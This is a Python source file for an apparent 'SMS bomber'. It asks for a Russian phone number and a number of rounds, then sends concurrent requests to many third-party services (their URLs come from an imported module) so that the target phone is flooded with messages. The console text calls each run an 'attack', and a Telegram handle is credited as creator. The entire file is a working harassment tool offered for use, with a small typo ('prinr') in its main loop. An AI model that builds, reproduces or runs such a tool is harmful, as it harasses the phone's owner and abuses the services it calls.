from asyncio import ensure_future, gather, run, set_event_loop_policy, WindowsSelectorEventLoopPolicy
from dbm import error

from aiohttp import ClientSession
from sys import platform

from Core.Services import get_Urls



if platform == 'win32':
    set_event_loop_policy(WindowsSelectorEventLoopPolicy())



async def Request(session: ClientSession, site: dict):
    method = site['method']
    url = site['url']
    timeout = 20

    params = site.get('params')
    cookies = site.get('cookies')
    headers = site.get('headers')
    data = site.get('data')
    json = site.get('json')

    try:
        async with session.request(method=method, url=url, params=params, cookies=cookies, headers=headers, data=data, json=json, timeout=timeout) as response:
            status = response.status
            text = await response.text()
            print(f'\tСервис: {url}\n\tУспех: [{status}] - {text}')
            # return text

    except Exception as error:
        print(f'\tСервис: {url}\n\tОшибка: {error}')
        # pass


async def Async_Attacks(number: str):
    async with ClientSession() as session:
        services = get_Urls(number)

        tasks = []
        for service in services:
            task = ensure_future(Request(session, service))
            tasks.append(task)

        await gather(*tasks)



async def HPV_Start_Attacks(number: str, replay: int):
    for iteration in range(int(replay)):
        print(f'\nЗапуск {iteration + 1}-кого круга...')
        await Async_Attacks(number)

if __name__ == '__main__':
    while True:
        prinr('\nСоздатель @seys666228\n')
        number = input('Номер: +7')
        replay = int(input('Количество повторений: '))


        print(f'Старт атаки!\nНомер: {number}\nКол-во кругов: {replay}')

        run(HPV_Start_Attacks(number, replay))

        print('\nАтака окончена!')
